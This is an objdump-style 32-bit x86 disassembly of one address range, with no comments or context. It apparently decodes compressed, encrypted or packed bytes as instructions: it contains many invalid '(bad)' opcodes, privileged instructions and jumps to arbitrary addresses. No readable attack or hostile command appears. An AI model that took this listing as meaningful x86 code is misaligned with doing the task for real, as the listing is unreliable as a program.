  41815d:	mov    dh,0xd8
  41815f:	dec    eax
  418160:	sahf   
  418161:	fucomip st,st(4)
  418163:	push   edi
  418164:	push   0xf9eb7026
  418169:	scas   al,BYTE PTR es:[edi]
  41816a:	pop    es
  41816b:	or     ebx,ebp
  41816d:	cmp    cl,BYTE PTR [ebx+eiz*8-0x32ba81a1]
  418174:	or     bl,BYTE PTR [ecx+0x6a]
  418177:	adc    DWORD PTR [esi+0x5bab8de2],edx
  41817d:	ret    0xe4d8
  418180:	sub    al,0x17
  418182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418183:	div    DWORD PTR [ecx+0x72427c7b]
  418189:	pop    es
  41818a:	aas    
  41818b:	lods   al,BYTE PTR ds:[esi]
  41818c:	or     ecx,eax
  41818e:	push   edx
  41818f:	loopne 0x41817a
  418191:	lds    esp,FWORD PTR [eax+0x6c]
  418194:	mov    DWORD PTR [edx],esi
  418196:	loope  0x4181b7
  418198:	ins    DWORD PTR es:[edi],dx
  418199:	or     BYTE PTR [edi-0x6a],0xa2
  41819d:	out    dx,eax
  41819e:	call   0x13d1:0x25060e7d
  4181a5:	jg     0x41819d
  4181a7:	dec    ebp
  4181a8:	(bad)
  4181ab:	sub    dl,bl
  4181ad:	push   esp
  4181ae:	cmp    ah,BYTE PTR [edi]
  4181b0:	test   BYTE PTR [ebx],dl
  4181b2:	(bad)  
  4181b3:	stos   BYTE PTR es:[edi],al
  4181b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181b5:	out    0xba,al
  4181b7:	push   0xffffff95
  4181b9:	pusha  
  4181ba:	jo     0x418163
  4181bc:	repz lock loopne 0x418200
  4181c0:	or     eax,0x1a4fc56a
  4181c5:	push   0x4f679c1b
  4181ca:	xchg   edx,eax
  4181cb:	dec    esi
  4181cc:	xchg   ecx,eax
  4181cd:	das    
  4181ce:	pop    ss
  4181cf:	cmp    bh,bl
  4181d1:	sbb    DWORD PTR [eax],esi
  4181d3:	stc    
  4181d4:	lods   al,BYTE PTR ds:[esi]
  4181d5:	ror    BYTE PTR [ecx+0x311e548c],0x3f
  4181dc:	repnz in eax,dx
  4181de:	test   eax,0xa6c76071
  4181e3:	mov    ch,dh
  4181e5:	inc    edi
  4181e6:	std    
  4181e7:	call   0x1e33ad30
  4181ec:	mov    eax,0x9b952724
  4181f1:	addr16 popf 
  4181f3:	xor    al,0x18
  4181f5:	mov    ebx,0xf8de6f3c
  4181fa:	test   al,0x46
  4181fc:	mov    esp,DWORD PTR [edi]
  4181fe:	mov    ?,WORD PTR [esi+0x9]
  418201:	ror    BYTE PTR [eax],0x73
  418204:	jne    0x4181ee
  418206:	data16 mov ch,0x40
  418209:	sbb    DWORD PTR [edi-0x39],edi
  41820c:	and    DWORD PTR [eax+0x57],ebx
  41820f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418210:	mov    al,0x27
  418212:	sub    ebp,DWORD PTR [ecx+0x60011fec]
  418218:	adc    eax,DWORD PTR [eax+0x7d]
  41821b:	cld    
  41821c:	adc    ch,BYTE PTR [ebp+ebx*4-0x6093d6ea]
  418223:	gs mov edx,0x665c0dcb
  418229:	fwait
  41822a:	adc    eax,0xeff2fcfb
  41822f:	push   ebp
  418230:	outs   dx,BYTE PTR ds:[esi]
  418231:	aam    0x2a
  418233:	mov    al,dh
  418235:	aad    0x56
  418237:	inc    ebx
  418238:	jb     0x4181ba
  41823a:	ror    BYTE PTR [ecx-0x7e],cl
  41823d:	jns    0x418245
  41823f:	lock or eax,0x920abbb1
  418245:	das    
  418246:	or     ebp,DWORD PTR [esi+eiz*2]
  418249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41824a:	jns    0x41821d
  41824c:	jae    0x4181fa
  41824e:	push   cs
  41824f:	test   al,0x95
  418251:	(bad)  
  418252:	out    dx,al
  418253:	lock jnp 0x41824d
  418256:	mov    ds:0x87f1a8e8,al
  41825b:	jle    0x418297
  41825d:	imul   eax,ecx,0x2d15ecb6
  418263:	xchg   edi,eax
  418264:	or     eax,0x32e4edda
  418269:	or     edx,eax
  41826b:	adc    BYTE PTR [edi],bh
  41826d:	jno    0x418242
  41826f:	mov    al,ds:0x25efd95a
  418274:	or     al,0x62
  418276:	push   ds
  418277:	pushf  
  418278:	mov    al,ds:0x19fa21ee
  41827d:	xlat   BYTE PTR ds:[ebx]
  41827e:	mov    ah,0x75
  418280:	fst    DWORD PTR [ecx-0x49]
  418283:	xchg   DWORD PTR [edx+0x22],edi
  418286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418287:	push   ss
  418288:	lds    esp,FWORD PTR [ebp+0xcd0fc28]
  41828e:	cmp    edx,0xffffffb5
  418291:	shr    DWORD PTR [ebp-0x38],0x49
  418295:	fwait
  418296:	lods   al,BYTE PTR ds:[esi]
  418297:	push   cs
  418298:	int    0x63
  41829a:	and    DWORD PTR [ebx-0x319e816c],esp
  4182a0:	in     eax,dx
  4182a1:	cmp    BYTE PTR [edx],bh
  4182a3:	dec    ebp
  4182a4:	xchg   eax,ebx
  4182a6:	and    BYTE PTR [edx+0x4b],bh
  4182a9:	sub    eax,0xf1a7ed16
  4182ae:	daa    
  4182af:	sti    
  4182b0:	test   DWORD PTR [edx-0x2474973d],esi
  4182b6:	jmp    0x5eb62034
  4182bb:	sub    eax,DWORD PTR [eax]
  4182bd:	(bad)  
  4182be:	jne    0x4182a6
  4182c0:	adc    DWORD PTR [esi+eiz*1],0xffffffdd
  4182c4:	sub    ecx,DWORD PTR [ebx-0xd17ea96]
  4182ca:	jmp    0xf16f:0xbb5426a5
  4182d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182d2:	jno    0x4182fc
  4182d4:	mov    ds:0x6c0061ba,eax
  4182d9:	jmp    0xcf0c6a52
  4182de:	test   al,0x3
  4182e0:	push   cs
  4182e1:	mov    esi,0xc110c1b5
  4182e6:	ret    0x7f22
  4182e9:	jg     0x41827b
  4182eb:	push   eax
  4182ec:	outs   dx,BYTE PTR ds:[esi]
  4182ed:	push   0x8b4f9fb0
  4182f2:	sub    eax,0x24fe87f5
  4182f7:	and    BYTE PTR [edi+0x4766954c],ch
  4182fd:	xchg   edi,eax
  4182fe:	stc    
  4182ff:	jmp    0xc00:0xcb1a514a
  418306:	fwait
  418307:	and    eax,0xe13061a
  41830c:	shr    DWORD PTR [edi],1
  41830e:	sub    BYTE PTR [edi-0x41],0x6d
  418312:	out    dx,eax
  418313:	call   0x232e04c8
  418318:	mov    ebp,0xd31b3b09
  41831d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41831e:	jne    0x4182e9
  418320:	pop    eax
  418321:	and    ecx,DWORD PTR [edi-0x6d759296]
  418327:	in     eax,dx
  418328:	addr16 jmp 0x248655a8
  41832e:	jmp    0x173a03a7
  418333:	xor    al,0x8d
  418335:	add    esp,DWORD PTR [edi-0x3b3dbc5d]
  41833b:	inc    eax
  41833c:	add    edi,DWORD PTR [ecx-0x4f]
  41833f:	scas   al,BYTE PTR es:[edi]
  418340:	mov    esi,0x782678fe
  418345:	cwde   
  418346:	jno    0x418396
  418348:	cdq    
  418349:	stos   BYTE PTR es:[edi],al
  41834a:	ds ja  0x418377
  41834d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41834e:	(bad)
  418352:	fisubr WORD PTR [ebx+0x1ff6057b]
  418358:	push   ds
  418359:	dec    ebx
  41835a:	sub    ebp,eax
  41835c:	xchg   edx,eax
  41835d:	ins    DWORD PTR es:[edi],dx
  41835e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41835f:	cmc    
  418360:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418361:	out    0xdd,eax
  418363:	imul   edi,DWORD PTR [edi+0x3dcbc25d],0xc9d7daa8
  41836d:	shl    DWORD PTR [eax],1
  41836f:	or     esi,DWORD PTR [ebx-0x71730692]
  418375:	rcr    ebp,1
  418377:	mov    bx,0x1955
  41837b:	retf   
  41837c:	pop    es
  41837d:	ret    0x44ab
  418380:	das    
  418381:	or     esi,DWORD PTR [eax+edi*8-0x524c515]
  418388:	push   esp
  418389:	mov    ah,bh
  41838b:	add    cl,dl
  41838d:	mov    bl,BYTE PTR [edi-0x4]
  418390:	jno    0x4183c5
  418392:	stc    
  418393:	mov    ebx,0x26c21821
  418398:	ins    BYTE PTR es:[edi],dx
  418399:	mov    bh,ch
  41839b:	dec    esp
  41839c:	xor    bl,dl
  41839e:	retf   
  41839f:	inc    ebx
  4183a0:	adc    edx,ebp
  4183a2:	adc    al,0x66
  4183a4:	retf   
  4183a5:	imul   ebx,esi,0x1d
  4183a8:	pop    ebp
  4183a9:	xor    eax,0xbdcae8e7
  4183ae:	ficomp DWORD PTR [ebx-0x40ba44e1]
  4183b4:	mov    eax,0xd89c387b
  4183b9:	lea    esp,[eax+0x29f63d]
  4183bf:	add    BYTE PTR [eax],al
  4183c1:	add    BYTE PTR [esi-0x144a9dc3],dl
  4183c7:	call   edi
  4183c9:	aas    
  4183ca:	popa   
  4183cb:	adc    ch,cl
  4183cd:	adc    ebx,0x22
  4183d0:	call   0x14290e9
  4183d5:	add    ah,dh
  4183d7:	add    al,0x0
  4183d9:	add    dl,dh
  4183db:	mov    esp,0xab84201
  4183e0:	mov    bl,0x27
  4183e2:	push   ss
  4183e3:	or     ah,BYTE PTR [esi+0x77]
  4183e6:	int    0xa9
  4183e8:	(bad)  [esi+0x11]
  4183eb:	in     eax,dx
  4183ec:	jg     0x4183a7
  4183ee:	ficomp DWORD PTR [edi+0x2e7e473a]
  4183f4:	mov    cl,0xbb
  4183f6:	(bad)  
  4183f7:	xchg   edx,eax
  4183f8:	pop    edx
  4183f9:	inc    eax
  4183fa:	cmp    ch,BYTE PTR [eax-0x59]
  4183fd:	clc    
  4183fe:	or     edi,DWORD PTR [ecx+0x70cc806c]
  418404:	sahf   
  418405:	popa   
  418406:	mov    dl,0x3d
  418408:	arpl   WORD PTR [ecx],sp
  41840a:	or     BYTE PTR [ebx+ebx*4],ah
  41840d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41840e:	sub    esp,ebx
  418410:	repnz stos BYTE PTR es:[edi],al
  418412:	out    dx,al
  418413:	pop    esp
  418414:	or     al,0x48
  418416:	inc    eax
  418417:	and    esp,DWORD PTR [edx+0x48]
  41841a:	jns    0x418451
  41841c:	push   esp
  41841d:	cmp    BYTE PTR [esi+0x7b],bl
  418420:	clc    
  418421:	in     al,dx
  418422:	in     eax,0xe1
  418424:	xchg   esp,eax
  418425:	fadd   QWORD PTR [edi]
  418427:	iret   
  418428:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418429:	pushf  
  41842a:	dec    ecx
  41842b:	sub    ch,BYTE PTR [eax+0xd]
  41842e:	fwait
  41842f:	or     BYTE PTR [edx+0x13],ch
  418432:	cmp    al,bl
  418434:	nop
  418435:	jecxz  0x41848e
  418437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418438:	or     BYTE PTR [edi+0x38e9ef87],0x6d
  41843f:	bswap  edx
  418441:	mov    bh,0xed
  418443:	mov    BYTE PTR [edi+0x15],0x88
  418447:	test   DWORD PTR [edi-0x19],edi
  41844a:	(bad)  [eax+0x49]
  41844d:	lea    eax,[eax]
  41844f:	leave  
  418450:	sub    edi,DWORD PTR [ecx+0x72bfbd5a]
  418456:	mov    edx,0x653f451d
  41845b:	fldl2t 
  41845d:	pop    esp
  41845e:	sbb    BYTE PTR [ebx+0x16],dl
  418461:	stos   DWORD PTR es:[edi],eax
  418462:	jae    0x418488
  418464:	cmp    eax,0x7d38dc1c
  418469:	cmp    al,0x29
  41846b:	sub    eax,0x51ab76d8
  418470:	pop    ebx
  418471:	jmp    0x48ff057d
  418476:	or     ebx,DWORD PTR [ebx+0x2d5b045a]
  41847c:	lds    esi,FWORD PTR [ecx]
  41847e:	mov    ds:0x7c1b7f1d,eax
  418483:	jge    0x4184f9
  418485:	(bad)
  418489:	fs pop ss
  41848b:	push   ss
  41848c:	and    DWORD PTR [ecx-0x286bbed5],ebp
  418492:	fdiv   st(2),st
  418494:	sub    al,0xa8
  418496:	cmp    BYTE PTR [eax-0x73],ah
  418499:	in     al,0x8a
  41849b:	mov    BYTE PTR ds:0x7febf2a1,bh
  4184a1:	cwde   
  4184a2:	pusha  
  4184a3:	and    al,0xf7
  4184a5:	xor    eax,DWORD PTR [ebx-0x71]
  4184a8:	sbb    DWORD PTR [edx],edx
  4184aa:	and    esp,DWORD PTR [eax]
  4184ac:	push   ebp
  4184ad:	mov    esp,0xe5bb418d
  4184b2:	fcom   DWORD PTR cs:[ecx+0x2e1784bb]
  4184b9:	inc    esp
  4184ba:	retf   
  4184bb:	pushf  
  4184bc:	je     0x418539
  4184be:	js     0x4184ee
  4184c0:	mov    edi,0x19b389d1
  4184c5:	mov    BYTE PTR [ecx],bh
  4184c7:	jecxz  0x41853f
  4184c9:	lock scas eax,DWORD PTR es:[edi]
  4184cb:	xchg   esi,eax
  4184cc:	inc    ebx
  4184cd:	fld    TBYTE PTR [edi+0x58c89899]
  4184d3:	adc    DWORD PTR [esi+0x4c],ecx
  4184d6:	pop    ebx
  4184d7:	lods   al,BYTE PTR ds:[esi]
  4184d8:	mov    ecx,0xc0da7c8f
  4184dd:	inc    edi
  4184de:	ins    DWORD PTR es:[edi],dx
  4184df:	mov    ds:0xc1dcf30e,eax
  4184e4:	push   esp
  4184e5:	mov    eax,ds:0x8ee73f83
  4184ea:	fdivr  DWORD PTR [ecx]
  4184ec:	(bad)  
  4184ed:	inc    edi
  4184ee:	push   es
  4184ef:	mov    ebx,0x7b1d46ec
  4184f4:	mov    al,ds:0x522afb8e
  4184f9:	mov    ds:0x1d7921c7,eax
  4184fe:	cdq    
  4184ff:	dec    ebp
  418500:	or     DWORD PTR [ecx-0x5f8a7fe7],0x10
  418507:	mov    ch,0x2f
  418509:	pop    edi
  41850a:	enter  0x5229,0xc1
  41850e:	push   0x5bdb4c3a
  418513:	push   ebx
  418514:	dec    ebp
  418515:	adc    ecx,DWORD PTR [edi]
  418517:	adc    ah,dh
  418519:	jmp    0x3c84369b
  41851e:	xlat   BYTE PTR ds:[ebx]
  41851f:	cs dec edi
  418521:	mov    ebp,0xc9e0a0f2
  418526:	sbb    BYTE PTR [edx],bl
  418528:	dec    ebp
  418529:	sbb    ebp,DWORD PTR [esi+0x2e]
  41852c:	mov    BYTE PTR [ebx-0x71],dl
  41852f:	adc    eax,0xd4898e38
  418534:	add    DWORD PTR [eax],edx
  418536:	jg     0x41855d
  418538:	js     0x41857c
  41853a:	cld    
  41853b:	and    eax,0x5797f01e
  418540:	or     dh,BYTE PTR [edi-0x161a8d70]
  418546:	add    al,0xeb
  418548:	xchg   ebx,eax
  418549:	cmp    al,0xfc
  41854b:	jg     0x4184f0
  41854d:	iret   
  41854e:	fwait
  41854f:	dec    edx
  418550:	ja     0x418568
  418552:	mov    ebp,0x3f776c5
  418557:	cmp    bh,BYTE PTR [esi+0x59]
  41855a:	xor    BYTE PTR [ebp-0x1c],bh
  41855d:	fwait
  41855e:	jne    0x4185d3
  418560:	push   edi
  418561:	(bad)
  418564:	addr16 jl 0x4185c2
  418567:	add    al,0x34
  41856a:	aam    0x25
  41856c:	aas    
  41856d:	or     al,0xc8
  41856f:	xchg   esi,eax
  418570:	jle    0x41855c
  418572:	fadd   DWORD PTR [edx+0x1c]
  418575:	leave  
  418576:	(bad)  
  418577:	icebp  
  418578:	mov    ebp,0x5372c5c6
  41857d:	and    eax,0x2528db7c
  418582:	aam    0x53
  418584:	adc    esi,DWORD PTR [ebp+esi*1+0x32]
  418588:	pop    esp
  418589:	repnz sbb bl,cl
  41858c:	in     eax,0x44
  41858e:	iret   
  41858f:	sub    edi,DWORD PTR ds:0xf1597e32
  418595:	rcr    BYTE PTR [esi],1
  418597:	mov    bh,0x84
  418599:	xlat   BYTE PTR ds:[ebx]
  41859a:	call   0xb3516e45
  41859f:	pop    esi
  4185a0:	fst    DWORD PTR [edi]
  4185a2:	test   al,0x71
  4185a4:	jmp    0x21d77efb
  4185a9:	jge    0x41857e
  4185ab:	aas    
  4185ac:	mov    esi,0x37040252
  4185b1:	dec    ebx
  4185b2:	cld    
  4185b3:	repnz (bad) 
  4185b5:	xlat   BYTE PTR ds:[ebx]
  4185b6:	adc    bh,bl
  4185b8:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185ba:	popa   
  4185bb:	dec    esp
  4185bc:	ss pop ebx
  4185be:	add    eax,DWORD PTR [ebx]
  4185c0:	iret   
  4185c1:	fild   WORD PTR [edi]
  4185c3:	ficom  DWORD PTR [edi-0x3083419c]
  4185c9:	pop    ss
  4185ca:	es sahf 
  4185cc:	fistp  DWORD PTR [esi+0x4786900a]
  4185d2:	push   eax
  4185d3:	or     BYTE PTR [ebx+0x77],dl
  4185d6:	sub    bl,BYTE PTR [esi+0x75]
  4185d9:	scas   eax,DWORD PTR es:[edi]
  4185da:	jne    0x41862f
  4185dc:	xchg   BYTE PTR ds:0xe3191be7,ah
  4185e2:	push   0x52
  4185e4:	pop    esp
  4185e5:	push   0x1a4cf018
  4185ea:	jae    0x4185b3
  4185ec:	sbb    BYTE PTR [esi+0x15b1e180],bh
  4185f2:	data16 ja 0x4185c0
  4185f5:	push   cs
  4185f6:	jmp    0x5febed5b
  4185fb:	fistp  QWORD PTR [edi]
  4185fd:	jge    0x418623
  4185ff:	pop    ebp
  418600:	or     eax,edx
  418602:	icebp  
  418603:	dec    esi
  418604:	push   esi
  418605:	shl    DWORD PTR [ecx-0x1b841de5],1
  41860b:	jo     0x41860c
  41860d:	test   al,0x24
  41860f:	aaa    
  418610:	add    al,0xc6
  418612:	xor    ebp,esi
  418614:	sbb    al,BYTE PTR [eax+edx*8]
  418617:	xchg   al,ah
  418619:	call   0x45b171eb
  41861e:	inc    eax
  41861f:	mov    WORD PTR [esi],?
  418621:	add    BYTE PTR [ebx],dh
  418623:	jle    0x418607
  418625:	add    al,0x2
  418627:	dec    esi
  418628:	xchg   ecx,eax
  418629:	xchg   ecx,eax
  41862a:	mov    ds:0xa1ccdddb,al
  41862f:	cmp    eax,ecx
  418631:	or     eax,0xe2e2e21c
  418636:	int3   
  418637:	xchg   DWORD PTR [ebx+0x4ecdafb2],edi
  41863d:	stos   BYTE PTR es:[edi],al
  41863e:	iret   
  41863f:	and    al,0xcb
  418641:	add    BYTE PTR [ebx],dh
  418643:	mov    dl,0x3f
  418645:	push   edi
  418646:	shl    BYTE PTR [edx+eiz*4],0x97
  41864a:	out    dx,al
  41864b:	inc    ebx
  41864c:	xchg   BYTE PTR [eax],cl
  41864e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41864f:	jnp    0x41865f
  418651:	cmc    
  418652:	dec    ebx
  418653:	test   BYTE PTR [esi-0x6a],ch
  418656:	inc    edx
  418657:	cmp    al,0xaf
  418659:	ja     0x418682
  41865b:	jno    0x418686
  41865d:	clc    
  41865e:	xor    DWORD PTR [ecx+eiz*1-0x55],edx
  418662:	inc    eax
  418663:	xor    esi,esi
  418665:	pop    ds
  418666:	jmp    0x666d3f4
  41866b:	push   ax
  41866d:	sub    al,0x6b
  41866f:	sahf   
  418670:	test   BYTE PTR ds:0x9fb7e17f,ch
  418676:	(bad)  
  418677:	push   ss
  418678:	scas   al,BYTE PTR es:[edi]
  418679:	je     0x418683
  41867b:	cdq    
  41867c:	sub    eax,0x922a42b2
  418681:	mov    eax,0x10d0fb5f
  418686:	inc    ecx
  418687:	in     eax,0x87
  418689:	mov    edi,0x37bd19c9
  41868e:	cmp    BYTE PTR [edi+0x2d94e30c],0xfa
  418695:	hlt    
  418696:	icebp  
  418697:	nop
  418698:	repz and eax,0x154dfb7d
  41869e:	add    eax,0x3915bb14
  4186a3:	xchg   BYTE PTR ds:0x1d1d7509,cl
  4186a9:	push   ds
  4186aa:	scas   eax,DWORD PTR es:[edi]
  4186ab:	ret    
  4186ac:	mov    edx,0x413dede8
  4186b1:	(bad)  
  4186b2:	jb     0x418723
  4186b4:	das    
  4186b5:	ins    BYTE PTR es:[edi],dx
  4186b6:	rcr    BYTE PTR [ebp-0x47287a02],cl
  4186bc:	cmp    DWORD PTR [ebp+0xd572aff],0xffffff88
  4186c3:	test   al,0x23
  4186c5:	mov    bl,BYTE PTR [ebp-0x43c80149]
  4186cb:	js     0x4186bc
  4186cd:	jb     0x4186ba
  4186cf:	mov    bh,0xe8
  4186d1:	xor    eax,0xed4fc35c
  4186d6:	es or  al,0x5e
  4186d9:	sub    BYTE PTR [edx+eax*2],ah
  4186dc:	es sbb ecx,ebx
  4186df:	cmp    BYTE PTR [ebx+eiz*8-0x3e],cl
  4186e3:	loopne 0x41871f
  4186e5:	xchg   edi,eax
  4186e6:	loop   0x418766
  4186e8:	(bad)  
  4186e9:	popa   
  4186ea:	cld    
  4186eb:	pop    ds
  4186ec:	aam    0xfa
  4186ee:	adc    eax,0x79478951
  4186f4:	test   DWORD PTR [edx],ebp
  4186f6:	xchg   esp,eax
  4186f7:	push   ds
  4186f8:	fs dec edi
  4186fa:	inc    ebx
  4186fb:	push   cs
  4186fc:	(bad)  
  4186fd:	stos   BYTE PTR es:[edi],al
  4186fe:	mov    ah,0x7f
  418700:	pushf  
  418701:	push   esp
  418702:	push   es
  418703:	dec    ecx
  418704:	shr    DWORD PTR [esi-0x15c82b73],cl
  41870a:	sbb    eax,0xff622204
  41870f:	je     0x4186b8
  418711:	inc    edi
  418712:	adc    DWORD PTR [edi-0x52],edx
  418715:	mov    bl,0xd9
  418717:	shr    DWORD PTR [ebx],cl
  418719:	ins    DWORD PTR es:[edi],dx
  41871a:	pop    es
  41871b:	lods   eax,DWORD PTR ds:[esi]
  41871c:	sti    
  41871d:	vfnmadd132sd xmm1,xmm6,QWORD PTR [ebp+0x5d]
  418723:	xor    bh,BYTE PTR [eax]
  418725:	push   ss
  418726:	mov    ds:0x2e60b3b4,eax
  41872b:	xor    al,0xf8
  41872d:	pop    edi
  41872e:	push   ss
  41872f:	inc    ebp
  418730:	sbb    ah,BYTE PTR [eax+0xe]
  418733:	xchg   DWORD PTR [edi],ebp
  418735:	inc    edx
  418736:	sub    dh,BYTE PTR [edi]
  418738:	add    BYTE PTR [ebp+0x1c702775],dh
  41873e:	out    dx,al
  41873f:	and    BYTE PTR [esi+0xf9aa104],ah
  418745:	mov    ecx,0xaaa991d9
  41874a:	inc    ebx
  41874b:	pop    edi
  41874c:	jns    0x418701
  41874e:	dec    esp
  41874f:	sbb    al,0xb8
  418751:	sbb    DWORD PTR [ebp+0x4],edx
  418754:	stos   DWORD PTR es:[edi],eax
  418755:	cmp    ecx,edx
  418757:	cmp    al,0x8e
  418759:	in     eax,dx
  41875a:	addr16 sti 
  41875c:	add    BYTE PTR [edx-0x32],dl
  41875f:	mov    esp,DWORD PTR [edi+0x52]
  418762:	jg     0x4187b8
  418764:	sub    BYTE PTR [edi-0x716dd88e],al
  41876a:	loop   0x41876a
  41876c:	test   DWORD PTR [esi],0xe8b67e1d
  418772:	mov    al,0x83
  418774:	addr16 test al,0xd2
  418777:	jge    0x418753
  418779:	jl     0x41873e
  41877b:	fimul  WORD PTR [eax]
  41877d:	shr    BYTE PTR [eax],cl
  41877f:	or     bl,BYTE PTR [ecx+0x53]
  418782:	inc    esi
  418783:	mov    dl,0xb5
  418785:	adc    BYTE PTR [ecx+0x5dcc6e69],bh
  41878b:	sub    BYTE PTR [ebx],bh
  41878d:	cmp    al,0xfa
  41878f:	push   0x2b
  418791:	inc    esp
  418792:	idiv   BYTE PTR [edx-0x46]
  418795:	push   ebx
  418796:	dec    edi
  418797:	sub    eax,0xb429b9b
  41879c:	sbb    eax,DWORD PTR [ebx-0x6d]
  41879f:	lods   al,BYTE PTR ds:[esi]
  4187a0:	xor    BYTE PTR [ebp-0x40164dd0],0xca
  4187a7:	and    DWORD PTR [ecx-0x761ba96f],0xffffffef
  4187ae:	add    edi,DWORD PTR [edi+0x6d]
  4187b1:	dec    edx
  4187b2:	outs   dx,BYTE PTR ds:[esi]
  4187b3:	push   ds
  4187b4:	add    al,0x22
  4187b6:	test   al,0x9f
  4187b8:	mov    eax,ds:0x9167ff66
  4187bd:	icebp  
  4187be:	sbb    BYTE PTR [edx+0x6d57c4cf],0xaa
  4187c5:	ja     0x4187fb
  4187c7:	xor    DWORD PTR [ecx+ebp*2+0x7b],esp
  4187cb:	xchg   esi,eax
  4187cc:	dec    edx
  4187cd:	imul   esi,DWORD PTR [ebx+0x1a4eaf34],0x1
  4187d4:	inc    ebp
  4187d5:	rol    BYTE PTR [ecx-0x6d],cl
  4187d8:	mov    ds,ebx
  4187da:	fisub  DWORD PTR ds:0x796695f5
  4187e0:	push   ebp
  4187e1:	cmp    ebp,DWORD PTR [esi+eax*1-0x46]
  4187e5:	test   dh,dh
  4187e7:	mov    WORD PTR [esi],es
  4187e9:	inc    edi
  4187ea:	lock dec ecx
  4187ec:	add    al,0x49
  4187ee:	loopne 0x4187a8
  4187f0:	mov    esi,0x6b124033
  4187f5:	inc    esp
  4187f6:	sub    bh,BYTE PTR [edx-0x21423e84]
  4187fc:	scas   al,BYTE PTR es:[edi]
  4187fd:	lods   eax,DWORD PTR ds:[esi]
  4187fe:	inc    edi
  4187ff:	add    al,0x9a
  418801:	mov    ecx,0x4825b1b8
  418806:	or     BYTE PTR [ecx-0x4c],dl
  418809:	out    0x36,eax
  41880b:	jp     0x4187fc
  41880d:	inc    edx
  41880e:	adc    ah,0x7f
  418811:	inc    esi
  418812:	push   0xfffffffd
  418814:	jp     0x418824
  418816:	and    al,0x48
  418818:	inc    esi
  418819:	or     al,0xf1
  41881b:	stos   BYTE PTR es:[edi],al
  41881c:	mov    ds:0x84c728ed,eax
  418821:	adc    eax,0xa26e04da
  418826:	test   WORD PTR [ebx-0x5481c2f],bx
  41882d:	les    edi,FWORD PTR [eax+ebx*8-0x19fd7e16]
  418834:	cmp    cl,BYTE PTR [edx-0x79]
  418837:	mov    bh,BYTE PTR fs:[ecx-0x37c9289e]
  41883e:	sub    DWORD PTR [edi-0x27],esi
  418841:	aaa    
  418842:	daa    
  418843:	cs xchg esp,eax
  418845:	leave  
  418846:	mov    DWORD PTR [esi+0x55],ecx
  418849:	push   ebp
  41884a:	sub    ecx,DWORD PTR [esi+0x6a84577a]
  418850:	outs   dx,BYTE PTR ds:[esi]
  418851:	xor    ecx,edi
  418853:	sahf   
  418854:	ja     0x418856
  418856:	mov    dl,0x49
  418858:	push   ebx
  418859:	data16 loope 0x41884b
  41885c:	xor    esp,ebp
  41885e:	nop
  41885f:	sahf   
  418860:	mov    ds:0x1400e0d2,eax
  418865:	adc    al,0x81
  418867:	push   esp
  418868:	cs mov edx,0x6cf1bc5
  41886e:	cwde   
  41886f:	sub    eax,0xf807ecfa
  418874:	je     0x418842
  418876:	(bad)  
  418877:	dec    esp
  418878:	jmp    0x4187fa
  41887a:	sub    dh,BYTE PTR [edx]
  41887c:	test   DWORD PTR [eax-0x5d1f6600],ecx
  418882:	cld    
  418883:	cmc    
  418884:	inc    ecx
  418885:	or     eax,0xa27b3dcc
  41888a:	fld    DWORD PTR [esi]
  41888c:	pop    esi
  41888d:	icebp  
  41888e:	(bad)  
  41888f:	mov    edx,0x50d8b723
  418894:	xchg   ebp,eax
  418895:	lock loope 0x418894
  418898:	icebp  
  418899:	inc    ecx
  41889a:	and    al,0xb1
  41889c:	out    dx,al
  41889d:	fsub   QWORD PTR ds:0xe84f0223
  4188a3:	and    DWORD PTR [ebx+edx*2-0x57703a06],edx
  4188aa:	mov    bl,0x9a
  4188ac:	mov    dl,BYTE PTR [edx+0x3f]
  4188af:	xor    dh,BYTE PTR [eax+0x1b8318e2]
  4188b5:	repz cdq 
  4188b7:	and    esi,esp
  4188b9:	pop    ebp
  4188ba:	mov    cl,0xb5
  4188bc:	xlat   BYTE PTR ds:[ebx]
  4188bd:	or     ebx,0x3f
  4188c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188c1:	add    DWORD PTR [ecx-0x76825683],edi
  4188c7:	fstp   DWORD PTR [edx-0x51]
  4188ca:	mov    eax,ds:0xd07f3
  4188cf:	add    BYTE PTR [eax],al
  4188d1:	add    BYTE PTR [esi-0x8290893],bl
  4188d7:	fidivr WORD PTR [edi-0x61f42993]
  4188dd:	int    0xdc
  4188df:	push   ss
  4188e0:	(bad)
  4188e3:	push   es
  4188e4:	add    DWORD PTR [eax],eax
  4188e6:	hlt    
  4188e7:	add    al,0x0
  4188e9:	add    BYTE PTR [esi],dh
  4188eb:	xchg   ebx,eax
  4188ec:	push   ds
  4188ed:	shr    BYTE PTR [edi-0x7f],cl
  4188f0:	cmp    cl,BYTE PTR [edi+0x5b20c473]
  4188f6:	stos   DWORD PTR es:[edi],eax
  4188f7:	jne    0x4188d0
  4188f9:	fbstp  TBYTE PTR [edx]
  4188fb:	int3   
  4188fc:	ss mov al,0xf7
  4188ff:	invd   
  418901:	sub    BYTE PTR [eax+0x19b50327],0x37
  418908:	cmp    dh,bl
  41890a:	add    eax,DWORD PTR [eax+0x56b765db]
  418910:	out    0x3b,al
  418912:	repz shl DWORD PTR [ebx-0x2],0xf0
  418917:	inc    esp
  418918:	push   cs
  418919:	ins    BYTE PTR es:[edi],dx
  41891a:	mov    DWORD PTR [eax+edi*1+0x556fee40],edx
  418921:	pop    esi
  418922:	mov    bh,0x75
  418924:	xchg   edi,eax
  418925:	fild   DWORD PTR [edi+eiz*8-0x7f]
  418929:	repnz sahf 
  41892b:	lahf   
  41892c:	pop    ds
  41892d:	fcom   QWORD PTR [ecx+ebx*8+0x21]
